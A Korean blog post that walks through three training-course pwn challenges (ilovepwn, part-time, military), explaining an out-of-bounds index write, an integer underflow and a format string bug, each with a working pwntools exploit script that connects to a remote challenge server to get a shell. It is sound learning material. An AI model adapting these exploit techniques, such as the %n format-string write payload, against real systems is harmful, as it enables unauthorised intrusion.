---
title: "[Pwn] Pwn Study Weak 3"
date: 2021-11-29T21:59:23+09:00
categories:
- Pwn
- Whois
tags:
- Pwn
keywords:
- tech
#thumbnailImage: //example.com/image.jpg
---

<!--more-->

Whois 신입회원 교육 마지막 주차 과제를 포스팅해보려 한다.  

# ilovepwn

문제를 확인해보자.

![problem](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/problem.PNG?raw=true)

일단 다운을 받아서 우분투에서 실행을 시켜야겠다.  

![ex](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/ex.PNG?raw=true)

문자열의 index 번호를 입력받고 해당 부분에 넣을 문자를 2차로 입력을 받는 것을 알 수 있다.  
이는 gdb를 통해서 자세히 확인해보자.  

![info func](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/info%20func.PNG?raw=true)

![pd main](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/pd%20main.PNG?raw=true)

가장 먼저 함수들을 확인하였는데, 특이한 함수는 없어보이기에 바로 main를 들여다봤다.  

![fcmp](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/fcmp.PNG?raw=true)

![type](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/type.PNG?raw=true)

흠.. 가장 먼저 %d를 통해서 정수를 rbp-0x8에 입력받는다.  
이후, 0x404070에 rbp-0x8의 값을 더한 주소에 scanf를 받는다.  

이후, 0x404070의 데이터를 rax에 저장하고, al 즉, rax의 가장 오른쪽 1byte를 0x23과 비교한다.  
리틀 엔디안이기에 가장 첫 글자의 값을 0x23으로 바꿔주면 된다.  

다음에는 key 값이라는 것을 출력한다. putchar를 총 8번 사용하는 것으로..  

![print key](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/print%20key.PNG?raw=true)

![key](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/key.PNG?raw=true)

이후에는 strcmp를 통해서 문자열 비교를 한다. 비교되는 대상을 아래 둘이다.  

![cmp sys](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/cmp%20sys.PNG?raw=true)

![str](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/str.PNG?raw=true)

이를 종합적으로 생각했을 때, 문자를 수정할 수 있는 기회는 첫 반복문일 때다.  
이를 통해서 0x404060의 key값과 0x404070에 있는 al 데이터를 고쳐준다면? 
정상적으로 문제가 풀릴 것이다.  

payload
```Python3
from pwn import *
context.log_level='debug'

#r = process('./ilovepwn', stdin=PTY, raw=False)
r = remote('49.50.167.74', 5301)


fakekey = 'ILOVEPW'

for i in range(-16, -9):
	r.recvuntil('FIX IT!')
	r.sendline(str(i))
	r.recvuntil('= ')
	r.sendline(fakekey[i+16])
	
r.recvuntil('FIX IT!')
r.sendline('0')
r.recvuntil('= ')
r.sendline('#')

r.interactive()
```

이러한 페이로드를 통해서 shell을 따낼 수 있다.  

![shell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/ilovepwn/shell.PNG?raw=true)

# part-time

![problem](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/problem.PNG?raw=true)

![ex](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/ex.PNG?raw=true)

흠.. 점수를 특정 메뉴를 통해서 증가, 감소하는 일종의 게임과 같다.  
필자가 가장 먼저 떠오른 공격은 Integer Issues이다.  

일단 함수 목록과 main을 확인해보자.  

![func](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/func.PNG?raw=true)

![pd main](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/pd%20main.PNG?raw=true)

흠.. 우리가 찾아가야 하는 곳은 system함수가 있는 +297이다.  

![system](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/system.PNG?raw=true)

![str](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/str.PNG?raw=true)

위 jmp 중에서 찾아보자.  

![jmp](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/jmp.PNG?raw=true)

흠.. eax가 0x3e7일 때가 가장 근접하다. 0x3e7 == 999이다.  
문제는 rbp-0x4와 0x17d78400을 비교하는데, 이보다 크지 못한 경우, 프로그램이 종료된다.  
그럼 rbp-0x4는 뭘까? score다.

![fscore](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/fscore.PNG?raw=true)

흠,, 그렇다면 이 score를 제어하는 부분이 있을 것이다.  

![score](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/score.PNG?raw=true)

초기 값이 30인데, 문제는 0x17d78400까지 가려면 너무 많은 값을 더해줘야 한다는 것이다..  
이를 해결하기 위해 score의 값을 0에서 -1을 함으로써 Integer Issues를 일으키려 한다.  

즉, sub 0x01을 실행하는 4를 총 31번 입력하고 999를 입력하여 해결할 수 있다..  

payload
```Python3
from pwn import *
context.log_level='debug'

#r = process('./part-time', stdin=PTY, raw=False)
r = remote('49.50.167.74', 5302)

for i in range(0, 31):
	r.recvuntil('>>')
	r.sendline('4')

r.recvuntil('>>')
r.sendline('999')

r.interactive()
```

이렇게 payload를 짜면 shell을 얻을 수 있다..  

![shell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/part-time/shell.PNG?raw=true)

# military

![problem](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/problem.PNG?raw=true)

![ex](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/ex.PNG?raw=true)

갓성님이 국가의 아들이 되러 가는 길을 축복하는 문제다.  
먼저 gdb를 통해 열어보자.. ( 조심스럽게.. )  

![func](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/func.PNG?raw=true)

![pd main](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/pd%20main.PNG?raw=true)

흠.. 특이한 함수는 없다. main을 확인해보면 현기증이 난다.  
특이한 점은 아래와 같다.  

![format](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/format.PNG?raw=true)

보통의 인자들은 word ptr[rbp-0x8]을 사용할텐데, 해당 문제는 rbp-0x8을 lea를 통해서 전달했다.  
여기서 Format string bug를 사용할 수 있을 것이다. 그렇다면 출력하는 위치가 어딜까?  

![check1](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/check1.PNG?raw=true)

흠.. 필자가 입력한 AAAAAAAA가 있는 위치는 8번째다.  
이를 통해서 8번째가 rbp-0x30이라는 것을 알 수 있다.  

그렇다면 이제 문제가 되는 부분이 어딘지 확인해보자.  

![cmp1](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/cmp1.PNG?raw=true)

흠.. 0x4040ac의 값과 0x226을 비교한다. 문제는 0x4040ac에는 아무 값도 없다는 것이다.  
이를 format string bug를 통해 해결해보자!  

0x226 -> 550으로 번역이 가능한데, 이를 활용해보자. %550c를 입력하면 공백 550칸을 출력한다.  
이를 $n을 통해서 특정 주소에 출력된 칸 수를 삽입할 수 있다.  
8번째가 사용자가 입력한 위치다. 즉, 10번째에 특정 주소를 넣어줌으로써 값을 삽입할 수 있다.  

![attack1](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/attack1.PNG?raw=true)

두 번째 비교문은 다음과 같다.  

![cmp2](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/cmp2.PNG?raw=true)

흠.. 여기서 문제는 비교하는 rbp-0x8이 서버와 process 간의 차이가 존재한다는 것.  
위치 차이가 아닌, 데이터 자체가 다르다. 이를 출력하기 위해서는 아까와 비슷한 방식이 쓰인다.  

8번째가 rbp-0x30이다 한 차례마다 0x8을 건너뛴다. 즉, 13번째는 rbp-0x8이라는 것이다.  
그렇다면 %p를 13번 넣어서 값을 확인해보면 된다.  

![attack2](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/attack2.PNG?raw=true)

이렇게 확인된 값을 ascii 문자로 바꿔서 다시 전송하면 해결할 수 있다!  

payload
```Python3
from pwn import *
import tty
context.log_level='debug'

#r = process('./military', stdin=PTY, raw=False)
r = remote('49.50.167.74', 5303)

r.recvuntil('job!')

r.sendline('%550c%10$nAAAAAA\xac\x40\x40\x00\x00\x00\x00\x00')

r.recvuntil('ment?')
r.sendline('%p%p%p%p%p%p%p%p%p%p%p%p %p')

r.recvline()
tmp = r.recvline()
tmp = tmp.split()
tmp2 = tmp[1]

tmp2 = tmp2[2:14]
tmp2 = str(tmp2, 'utf-8')
tmp3 = list(map(''.join, zip(*[iter(tmp2)]*2)))
tmp4 = [0, 0, 0, 0, 0, 0]

for i in range(0, 6):
	tmp4[i] = bytes.fromhex(tmp3[i])
	tmp4[i] = tmp4[i].decode("ASCII")

tmp4.reverse()
tmp5 = ''.join(tmp4)
r.send(tmp5)

r.interactive()
```

이렇게 Payload를 짬으로써 shell을 얻을 수 있다..  

![shell](https://github.com/RoomRooms/blog/blob/master/img/Pwn/Whois_Study/weak_3/military/shell.PNG?raw=true)

이렇게 whois 신입 교육이 마무리되었다. 어렵기도 재밌기도 했지만, 미루고 몰아서 한 감이 없지 않다.  
비록 사전 지식이 있었지만, 이는 옳지 못한 방식이기에 다음부터는 이를 고쳐보고자 한다.  

신입 교육을 지도해주신 김응서 강사님, 강찬우 강사님, 김종성 강사님에게 감사의 말씀을 드립니다.  
